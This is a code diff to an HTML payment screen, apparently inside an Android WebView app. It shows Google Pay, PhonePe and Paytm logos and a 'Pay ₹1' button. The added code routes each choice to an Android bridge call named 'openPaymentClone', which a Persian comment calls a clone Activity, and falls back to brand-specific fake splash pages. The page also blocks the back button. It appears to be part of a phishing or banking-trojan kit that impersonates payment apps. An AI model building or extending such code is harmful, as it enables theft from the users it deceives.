@@ -266,21 +266,21 @@
       <div class="section-title">Select Payment</div>
       
       <div class="pay-options">
-        <div class="pay-option" onclick="goToSplash()">
+        <div class="pay-option" onclick="selectPaymentMethod('gpay')">
           <!-- Google Pay Logo -->
           <img src="google-pay-icon.png" alt="Google Pay" style="width: 100%; height: auto; object-fit: contain;">
         </div>
-        <div class="pay-option" onclick="goToSplash()">
+        <div class="pay-option" onclick="selectPaymentMethod('phonepe')">
           <!-- PhonePe Logo -->
           <img src="phonepe-icon.png" alt="PhonePe" style="width: 100%; height: auto; object-fit: contain;">
         </div>
-        <div class="pay-option" onclick="goToSplash()">
+        <div class="pay-option" onclick="selectPaymentMethod('paytm')">
           <!-- Paytm Logo -->
           <img src="paytm-icon.png" alt="Paytm" style="width: 100%; height: auto; object-fit: contain;">
         </div>
       </div>
       
-      <button class="pay-btn" onclick="goToSplash()">💳 Pay ₹1</button>
+      <button class="pay-btn" onclick="selectPaymentMethod('gpay')">💳 Pay ₹1</button>
     </div>
     
     <div class="secure">
@@ -307,8 +307,27 @@
       history.go(1);
     };
     
-    function goToSplash() {
-      window.location.href = 'googlepay-splash.html';
+    function selectPaymentMethod(method) {
+      try {
+        console.log('💰 selectPaymentMethod called with method:', method);
+        // فراخوانی Android برای باز کردن Activity کلون
+        if (typeof Android !== 'undefined' && Android.openPaymentClone) {
+          console.log('✅ Android interface available, calling openPaymentClone with:', method);
+          Android.openPaymentClone(method);
+        } else {
+          console.error('❌ Android interface not available');
+          // Fallback: برو به splash مربوطه
+          if (method === 'gpay') {
+            window.location.href = 'googlepay-splash.html';
+          } else if (method === 'paytm') {
+            window.location.href = 'paytm-splash.html';
+          } else if (method === 'phonepe') {
+            window.location.href = 'phonepe-splash.html';
+          }
+        }
+      } catch (e) {
+        console.error('❌ Error opening payment clone:', e);
+      }
     }
   </script>
 </body>
